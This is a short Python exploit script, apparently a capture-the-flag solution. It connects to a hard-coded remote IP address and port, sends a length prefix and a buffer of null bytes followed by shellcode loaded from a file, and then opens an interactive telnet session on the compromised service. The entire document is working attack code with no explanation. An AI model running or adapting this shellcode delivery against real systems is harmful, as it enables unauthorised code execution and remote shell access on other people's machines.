#!/usr/bin/env python

import socket
import struct
import time
import telnetlib


ADDR = "localhost"
PORT = 8888

ADDR = "210.71.253.109"
PORT = 9123
s = socket.create_connection((ADDR, PORT))

buf = "A" * (0x100)
s.send(str(len(buf)).rjust(8, "0"))

s.send("\x00" * 256 + open("sc.bin","r").read().ljust(256, "A"))

t = telnetlib.Telnet()
t.sock = s
t.interact()
